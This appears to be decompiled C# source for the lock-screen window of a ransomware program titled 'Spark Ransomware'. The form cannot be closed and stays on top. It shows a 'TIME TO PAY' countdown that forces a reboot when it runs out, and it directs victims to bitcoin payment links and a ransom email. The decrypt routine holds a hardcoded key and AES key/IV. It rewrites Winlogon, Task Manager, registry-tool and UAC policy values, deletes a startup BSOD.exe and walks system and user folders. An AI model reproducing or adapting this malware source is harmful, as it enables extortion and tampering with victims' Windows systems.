using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using RANSOMWARE3._0.Properties;

namespace RANSOMWARE3._0;

public class Window : Form
{
	private DateTime startTime;

	private int delay = 80800;

	private IContainer components = null;

	private Label lbl_title;

	private RichTextBox text1;

	private PictureBox bit_logo;

	private Label lbl_title2;

	private RichTextBox text2;

	private TextBox box_email;

	private TextBox box_key;

	private Button btn_copy;

	private Button btn_decrypt;

	private Label title_time;

	private Label lbl_count;

	private LinkLabel link_bit;

	private LinkLabel link_click;

	private LinkLabel link_ransom;

	private Label lbl_date;

	private Timer timer1;

	private PictureBox pictureBox1;

	private ProgressBar progressBar1;

	private Timer timer2;

	public Window()
	{
		InitializeComponent();
	}

	private void Window_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Window_Load(object sender, EventArgs e)
	{
		((Form)this).set_Size(new Size(713, 663));
		((Control)lbl_title).set_Location(new Point(12, 7));
		((Control)pictureBox1).set_Size(new Size(203, 187));
		((Control)pictureBox1).set_Location(new Point(12, 55));
		((Control)text1).set_Size(new Size(465, 187));
		((Control)text1).set_Location(new Point(221, 55));
		((Control)bit_logo).set_Size(new Size(397, 108));
		((Control)bit_logo).set_Location(new Point(12, 248));
		((Control)lbl_title2).set_Location(new Point(12, 362));
		((Control)text2).set_Size(new Size(271, 120));
		((Control)text2).set_Location(new Point(26, 405));
		((Control)box_email).set_Size(new Size(295, 26));
		((Control)box_email).set_Location(new Point(2, 539));
		((Control)box_key).set_Size(new Size(295, 26));
		((Control)box_key).set_Location(new Point(2, 581));
		((Control)btn_copy).set_Size(new Size(96, 26));
		((Control)btn_copy).set_Location(new Point(303, 539));
		((Control)btn_decrypt).set_Size(new Size(96, 26));
		((Control)btn_decrypt).set_Location(new Point(303, 581));
		((Control)lbl_date).set_Location(new Point(604, 419));
		((Control)title_time).set_Location(new Point(575, 439));
		((Control)lbl_count).set_Location(new Point(630, 497));
		((Control)link_bit).set_Location(new Point(402, 439));
		((Control)link_click).set_Location(new Point(571, 561));
		((Control)link_ransom).set_Location(new Point(362, 497));
		((Control)lbl_date).set_Text(DateTime.Now.ToString("dddd , MMM dd yyyy,hh:mm:ss"));
	}

	private void timer2_Tick(object sender, EventArgs e)
	{
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		double totalMilliseconds = (DateTime.Now - startTime).TotalMilliseconds;
		double num = 80400000.0;
		int num2 = (int)(totalMilliseconds / num * 400.0);
		progressBar1.set_Value(Math.Min(num2, 100));
		if (num2 >= 100)
		{
			timer2.Stop();
			MessageBox.Show("Times Up!");
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		startTime = DateTime.Now;
		timer2.Start();
	}

	private void link_bit_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		ProcessStartInfo startInfo = new ProcessStartInfo("https://en.wikipedia.org/wiki/Bitcoin");
		Process.Start(startInfo);
	}

	private void link_click_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		ProcessStartInfo startInfo = new ProcessStartInfo("https://supercoin.it/cz-trading-platform/16228?sorgente=2&gclid=CjwKCAjw3cSSBhBGEiwAVII0Z-8AbRF_QvW-BPUbt_LJ66RruwyMEYjK3QmldW2vvkO4nNPB9oJEMhoCcz4QAvD_BwE");
		Process.Start(startInfo);
	}

	private void link_ransom_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		ProcessStartInfo startInfo = new ProcessStartInfo("https://en.wikipedia.org/wiki/Ransomware");
		Process.Start(startInfo);
	}

	private void btn_decrypt_Click(object sender, EventArgs e)
	{
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_0088: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)box_key).get_Text() == "fTJHFyj8TB47FtjhyYGYFTrttBI")
		{
			Thread thread = new Thread(backup);
			thread.Start();
			MessageBox.Show("Correct key, your files were decrypted!", "UNLOCKED", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		else if (((Control)box_key).get_Text() == "")
		{
			MessageBox.Show("Incorrect key", "LOCKED", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		else
		{
			MessageBox.Show("Incorrect key", "LOCKED", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public void backup()
	{
		File.Create(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\decrypted");
		RegistryKey registryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("FilterAdministratorToken", 0, RegistryValueKind.DWord);
		RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey2.SetValue("EnableLUA", 1, RegistryValueKind.DWord);
		RegistryKey registryKey3 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey3.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
		RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey4.SetValue("DisableRegistryTools", 0, RegistryValueKind.DWord);
		RegistryKey registryKey5 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey5.SetValue("Shell", "explorer.exe", RegistryValueKind.String);
		RegistryKey registryKey6 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
		registryKey6.SetValue("Userinit", "C:\\Windows\\System32\\userinit.exe", RegistryValueKind.String);
		if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BSOD.exe"))
		{
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\BSOD.exe");
		}
		char[] trimChars = new char[6] { 'S', 'p', 'a', 'r', 'k', '.' };
		try
		{
			string[] files = Directory.GetFiles("C:\\");
			string[] array = files;
			foreach (string text in array)
			{
				try
				{
					DecryptFile(text, text.TrimEnd(trimChars));
					File.Delete(text);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files2 = Directory.GetFiles("C:\\Program Files");
			string[] array2 = files2;
			foreach (string text2 in array2)
			{
				try
				{
					DecryptFile(text2, text2.TrimEnd(trimChars));
					File.Delete(text2);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files3 = Directory.GetFiles("C:\\Program Files (x86)");
			string[] array3 = files3;
			foreach (string text3 in array3)
			{
				try
				{
					DecryptFile(text3, text3.TrimEnd(trimChars));
					File.Delete(text3);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files4 = Directory.GetFiles("C:\\Users");
			string[] array4 = files4;
			foreach (string text4 in array4)
			{
				try
				{
					DecryptFile(text4, text4.TrimEnd(trimChars));
					File.Delete(text4);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files5 = Directory.GetFiles("C:\\Windows");
			string[] array5 = files5;
			foreach (string text5 in array5)
			{
				try
				{
					DecryptFile(text5, text5.TrimEnd(trimChars));
					File.Delete(text5);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] files6 = Directory.GetFiles("C:\\Windows\\System32");
			string[] array6 = files6;
			foreach (string text6 in array6)
			{
				try
				{
					DecryptFile(text6, text6.TrimEnd(trimChars));
					File.Delete(text6);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string[] files7 = Directory.GetFiles(folderPath);
			string[] array7 = files7;
			foreach (string text7 in array7)
			{
				try
				{
					DecryptFile(text7, text7.TrimEnd(trimChars));
					File.Delete(text7);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
			string[] files8 = Directory.GetFiles(folderPath2);
			string[] array8 = files8;
			foreach (string text8 in array8)
			{
				try
				{
					DecryptFile(text8, text8.TrimEnd(trimChars));
					File.Delete(text8);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
			string[] files9 = Directory.GetFiles(folderPath3);
			string[] array9 = files9;
			foreach (string text9 in array9)
			{
				try
				{
					DecryptFile(text9, text9.TrimEnd(trimChars));
					File.Delete(text9);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
			string[] files10 = Directory.GetFiles(folderPath4);
			string[] array10 = files10;
			foreach (string text10 in array10)
			{
				try
				{
					DecryptFile(text10, text10.TrimEnd(trimChars));
					File.Delete(text10);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath5 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
			string[] files11 = Directory.GetFiles(folderPath5);
			string[] array11 = files11;
			foreach (string text11 in array11)
			{
				try
				{
					DecryptFile(text11, text11.TrimEnd(trimChars));
					File.Delete(text11);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath6 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
			string[] files12 = Directory.GetFiles(folderPath6);
			string[] array12 = files12;
			foreach (string text12 in array12)
			{
				try
				{
					DecryptFile(text12, text12.TrimEnd(trimChars));
					File.Delete(text12);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string folderPath7 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
			string[] files13 = Directory.GetFiles(folderPath7);
			string[] array13 = files13;
			foreach (string text13 in array13)
			{
				try
				{
					DecryptFile(text13, text13.TrimEnd(trimChars));
					File.Delete(text13);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		try
		{
			string[] array14 = new string[26]
			{
				"A:\\", "B:\\", "D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "CH:\\", "I:\\", "J:\\",
				"K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\",
				"U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"
			};
			string[] array15 = array14;
			foreach (string text14 in array15)
			{
				try
				{
					DecryptFile(text14, text14.TrimEnd(trimChars));
					File.Delete(text14);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
		((Control)this).Hide();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (delay >= 0)
		{
			TimeSpan timeSpan = TimeSpan.FromSeconds(--delay);
			((Control)lbl_count).set_Text(timeSpan.ToString("hh\\:mm\\:ss"));
			return;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "shutdown.exe";
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.Arguments = "shutdown /r /t 0";
		Process.Start(processStartInfo);
		Environment.Exit(-1);
	}

	private void DecryptFile(string inputFile, string outputFile)
	{
		try
		{
			string s = "d5a01s9u";
			UnicodeEncoding unicodeEncoding = new UnicodeEncoding();
			byte[] bytes = unicodeEncoding.GetBytes(s);
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(bytes, bytes), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
			int num;
			while ((num = cryptoStream.ReadByte()) != -1)
			{
				fileStream2.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
		}
		catch
		{
		}
	}

	private void lbl_count_Click(object sender, EventArgs e)
	{
	}

	private void btn_copy_Click(object sender, EventArgs e)
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			Clipboard.SetText("notvalidemailadress.ransom@gmail.com");
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
		thread.Join();
	}

	private void text1_TextChanged(object sender, EventArgs e)
	{
	}

	private void bit_logo_Click(object sender, EventArgs e)
	{
	}

	private void lbl_title_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c7: Expected O, but got Unknown
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d2: Expected O, but got Unknown
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dd: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Expected O, but got Unknown
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		//IL_015e: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Expected O, but got Unknown
		//IL_02f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02fd: Expected O, but got Unknown
		//IL_0396: Unknown result type (might be due to invalid IL or missing references)
		//IL_03a0: Expected O, but got Unknown
		//IL_0448: Unknown result type (might be due to invalid IL or missing references)
		//IL_0452: Expected O, but got Unknown
		//IL_04f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_04fa: Expected O, but got Unknown
		//IL_0577: Unknown result type (might be due to invalid IL or missing references)
		//IL_0581: Expected O, but got Unknown
		//IL_0624: Unknown result type (might be due to invalid IL or missing references)
		//IL_062e: Expected O, but got Unknown
		//IL_06f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06fa: Expected O, but got Unknown
		//IL_07ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b5: Expected O, but got Unknown
		//IL_0870: Unknown result type (might be due to invalid IL or missing references)
		//IL_087a: Expected O, but got Unknown
		//IL_08f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0902: Expected O, but got Unknown
		//IL_0931: Unknown result type (might be due to invalid IL or missing references)
		//IL_093b: Expected O, but got Unknown
		//IL_09b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_09c3: Expected O, but got Unknown
		//IL_09f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_09fc: Expected O, but got Unknown
		//IL_0a7a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a84: Expected O, but got Unknown
		//IL_0ac7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ad1: Expected O, but got Unknown
		//IL_0bb8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0bc2: Expected O, but got Unknown
		//IL_0ed6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ee0: Expected O, but got Unknown
		//IL_0f5d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f67: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Window));
		lbl_title = new Label();
		text1 = new RichTextBox();
		lbl_title2 = new Label();
		text2 = new RichTextBox();
		box_email = new TextBox();
		box_key = new TextBox();
		btn_copy = new Button();
		btn_decrypt = new Button();
		title_time = new Label();
		lbl_count = new Label();
		link_bit = new LinkLabel();
		link_click = new LinkLabel();
		link_ransom = new LinkLabel();
		lbl_date = new Label();
		timer1 = new Timer(components);
		bit_logo = new PictureBox();
		pictureBox1 = new PictureBox();
		progressBar1 = new ProgressBar();
		timer2 = new Timer(components);
		((ISupportInitialize)bit_logo).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)lbl_title).set_AutoSize(true);
		((Control)lbl_title).set_BackColor(Color.Silver);
		lbl_title.set_BorderStyle((BorderStyle)2);
		((Control)lbl_title).set_Font(new Font("Arial Black", 20.25f, (FontStyle)1));
		((Control)lbl_title).set_ForeColor(Color.White);
		((Control)lbl_title).set_Location(new Point(131, 4));
		((Control)lbl_title).set_Name("lbl_title");
		((Control)lbl_title).set_Size(new Size(428, 40));
		((Control)lbl_title).set_TabIndex(0);
		((Control)lbl_title).set_Text("Whats wrong with my files?");
		((Control)lbl_title).add_Click((EventHandler)lbl_title_Click);
		((Control)text1).set_BackColor(Color.Silver);
		((Control)text1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)text1).set_ForeColor(SystemColors.Window);
		((Control)text1).set_Location(new Point(221, 47));
		((Control)text1).set_Name("text1");
		((TextBoxBase)text1).set_ReadOnly(true);
		((Control)text1).set_Size(new Size(465, 195));
		((Control)text1).set_TabIndex(2);
		((Control)text1).set_Text(componentResourceManager.GetString("text1.Text"));
		((Control)text1).add_TextChanged((EventHandler)text1_TextChanged);
		((Control)lbl_title2).set_AutoSize(true);
		((Control)lbl_title2).set_BackColor(Color.Transparent);
		lbl_title2.set_BorderStyle((BorderStyle)2);
		((Control)lbl_title2).set_Font(new Font("Arial Black", 20.25f, (FontStyle)1));
		((Control)lbl_title2).set_ForeColor(Color.White);
		((Control)lbl_title2).set_Location(new Point(12, 362));
		((Control)lbl_title2).set_Name("lbl_title2");
		((Control)lbl_title2).set_Size(new Size(267, 40));
		((Control)lbl_title2).set_TabIndex(4);
		((Control)lbl_title2).set_Text("HOW CAN I PAY?");
		((Control)text2).set_BackColor(Color.Silver);
		((Control)text2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)238));
		((Control)text2).set_ForeColor(SystemColors.Window);
		((Control)text2).set_Location(new Point(26, 405));
		((Control)text2).set_Name("text2");
		((TextBoxBase)text2).set_ReadOnly(true);
		((Control)text2).set_Size(new Size(271, 128));
		((Control)text2).set_TabIndex(5);
		((Control)text2).set_Text(componentResourceManager.GetString("text2.Text"));
		((Control)box_email).set_BackColor(Color.Silver);
		((Control)box_email).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)box_email).set_ForeColor(Color.White);
		((Control)box_email).set_Location(new Point(2, 539));
		((Control)box_email).set_Name("box_email");
		((TextBoxBase)box_email).set_ReadOnly(true);
		((Control)box_email).set_Size(new Size(295, 26));
		((Control)box_email).set_TabIndex(6);
		((Control)box_email).set_Text("notvalidemailadress.ransom@gmail.com");
		((Control)box_key).set_BackColor(Color.Silver);
		((Control)box_key).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)box_key).set_ForeColor(Color.White);
		((Control)box_key).set_Location(new Point(2, 581));
		((Control)box_key).set_Name("box_key");
		((Control)box_key).set_Size(new Size(295, 26));
		((Control)box_key).set_TabIndex(7);
		((ButtonBase)btn_copy).set_FlatStyle((FlatStyle)3);
		((Control)btn_copy).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1));
		((Control)btn_copy).set_Location(new Point(303, 539));
		((Control)btn_copy).set_Name("btn_copy");
		((Control)btn_copy).set_Size(new Size(96, 26));
		((Control)btn_copy).set_TabIndex(8);
		((Control)btn_copy).set_Text("COPY");
		((ButtonBase)btn_copy).set_UseVisualStyleBackColor(true);
		((Control)btn_copy).add_Click((EventHandler)btn_copy_Click);
		((ButtonBase)btn_decrypt).set_FlatStyle((FlatStyle)3);
		((Control)btn_decrypt).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1));
		((Control)btn_decrypt).set_Location(new Point(303, 581));
		((Control)btn_decrypt).set_Name("btn_decrypt");
		((Control)btn_decrypt).set_Size(new Size(96, 26));
		((Control)btn_decrypt).set_TabIndex(9);
		((Control)btn_decrypt).set_Text("DECRYPT");
		((ButtonBase)btn_decrypt).set_UseVisualStyleBackColor(true);
		((Control)btn_decrypt).add_Click((EventHandler)btn_decrypt_Click);
		((Control)title_time).set_AutoSize(true);
		((Control)title_time).set_BackColor(Color.Transparent);
		title_time.set_BorderStyle((BorderStyle)2);
		((Control)title_time).set_Font(new Font("Arial Black", 30f, (FontStyle)1));
		((Control)title_time).set_ForeColor(Color.White);
		((Control)title_time).set_Location(new Point(575, 439));
		((Control)title_time).set_Name("title_time");
		((Control)title_time).set_Size(new Size(310, 58));
		((Control)title_time).set_TabIndex(10);
		((Control)title_time).set_Text("TIME TO PAY");
		((Control)lbl_count).set_AutoSize(true);
		((Control)lbl_count).set_BackColor(Color.Transparent);
		lbl_count.set_BorderStyle((BorderStyle)2);
		((Control)lbl_count).set_Font(new Font("Arial Black", 30f, (FontStyle)1));
		((Control)lbl_count).set_ForeColor(Color.White);
		((Control)lbl_count).set_Location(new Point(630, 497));
		((Control)lbl_count).set_Name("lbl_count");
		((Control)lbl_count).set_Size(new Size(214, 58));
		((Control)lbl_count).set_TabIndex(11);
		((Control)lbl_count).set_Text("00:00:00");
		((Control)lbl_count).add_Click((EventHandler)lbl_count_Click);
		((Control)link_bit).set_AutoSize(true);
		((Control)link_bit).set_BackColor(Color.Transparent);
		((Control)link_bit).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)link_bit).set_Location(new Point(402, 439));
		((Control)link_bit).set_Name("link_bit");
		((Control)link_bit).set_Size(new Size(134, 20));
		((Control)link_bit).set_TabIndex(12);
		link_bit.set_TabStop(true);
		((Control)link_bit).set_Text("What is a bitcoin?");
		link_bit.add_LinkClicked(new LinkLabelLinkClickedEventHandler(link_bit_LinkClicked));
		((Control)link_click).set_AutoSize(true);
		((Control)link_click).set_BackColor(Color.Transparent);
		((Control)link_click).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)link_click).set_Location(new Point(571, 561));
		((Control)link_click).set_Name("link_click");
		((Control)link_click).set_Size(new Size(291, 20));
		((Control)link_click).set_TabIndex(13);
		link_click.set_TabStop(true);
		((Control)link_click).set_Text("Don't have a bitcoin address? Click here");
		link_click.add_LinkClicked(new LinkLabelLinkClickedEventHandler(link_click_LinkClicked));
		((Control)link_ransom).set_AutoSize(true);
		((Control)link_ransom).set_BackColor(Color.Transparent);
		((Control)link_ransom).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)link_ransom).set_Location(new Point(362, 497));
		((Control)link_ransom).set_Name("link_ransom");
		((Control)link_ransom).set_Size(new Size(208, 20));
		((Control)link_ransom).set_TabIndex(14);
		link_ransom.set_TabStop(true);
		((Control)link_ransom).set_Text("WHAT IS RANSOMWARE?");
		link_ransom.add_LinkClicked(new LinkLabelLinkClickedEventHandler(link_ransom_LinkClicked));
		((Control)lbl_date).set_AutoSize(true);
		((Control)lbl_date).set_BackColor(Color.Transparent);
		lbl_date.set_BorderStyle((BorderStyle)2);
		((Control)lbl_date).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)238));
		((Control)lbl_date).set_ForeColor(Color.White);
		((Control)lbl_date).set_Location(new Point(604, 419));
		((Control)lbl_date).set_Name("lbl_date");
		((Control)lbl_date).set_Size(new Size(251, 22));
		((Control)lbl_date).set_TabIndex(15);
		((Control)lbl_date).set_Text("dddd, mmm dd yyyy, hh mm ss");
		timer1.set_Enabled(true);
		timer1.set_Interval(1000);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)bit_logo).set_BackgroundImageLayout((ImageLayout)3);
		bit_logo.set_BorderStyle((BorderStyle)2);
		((Control)bit_logo).set_Cursor(Cursors.get_No());
		bit_logo.set_Image((Image)componentResourceManager.GetObject("bit_logo.Image"));
		((Control)bit_logo).set_Location(new Point(2, 248));
		((Control)bit_logo).set_Name("bit_logo");
		((Control)bit_logo).set_Size(new Size(397, 108));
		bit_logo.set_SizeMode((PictureBoxSizeMode)1);
		bit_logo.set_TabIndex(3);
		bit_logo.set_TabStop(false);
		((Control)bit_logo).add_Click((EventHandler)bit_logo_Click);
		((Control)pictureBox1).set_BackgroundImageLayout((ImageLayout)3);
		pictureBox1.set_BorderStyle((BorderStyle)2);
		((Control)pictureBox1).set_Cursor(Cursors.get_No());
		pictureBox1.set_Image((Image)(object)Resources.i1);
		((Control)pictureBox1).set_Location(new Point(2, 47));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(213, 195));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		pictureBox1.set_TabIndex(1);
		pictureBox1.set_TabStop(false);
		((Control)progressBar1).set_Location(new Point(406, 250));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(479, 80));
		((Control)progressBar1).set_TabIndex(16);
		timer2.set_Interval(1000);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Silver);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(897, 619));
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)lbl_date);
		((Control)this).get_Controls().Add((Control)(object)link_ransom);
		((Control)this).get_Controls().Add((Control)(object)link_click);
		((Control)this).get_Controls().Add((Control)(object)link_bit);
		((Control)this).get_Controls().Add((Control)(object)lbl_count);
		((Control)this).get_Controls().Add((Control)(object)title_time);
		((Control)this).get_Controls().Add((Control)(object)btn_decrypt);
		((Control)this).get_Controls().Add((Control)(object)btn_copy);
		((Control)this).get_Controls().Add((Control)(object)box_key);
		((Control)this).get_Controls().Add((Control)(object)box_email);
		((Control)this).get_Controls().Add((Control)(object)text2);
		((Control)this).get_Controls().Add((Control)(object)lbl_title2);
		((Control)this).get_Controls().Add((Control)(object)bit_logo);
		((Control)this).get_Controls().Add((Control)(object)text1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)lbl_title);
		((Control)this).set_DoubleBuffered(true);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_MaximumSize(new Size(913, 658));
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_MinimumSize(new Size(913, 658));
		((Control)this).set_Name("Window");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Spark Ransomware");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Window_FormClosing));
		((Form)this).add_Load((EventHandler)Window_Load);
		((ISupportInitialize)bit_logo).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
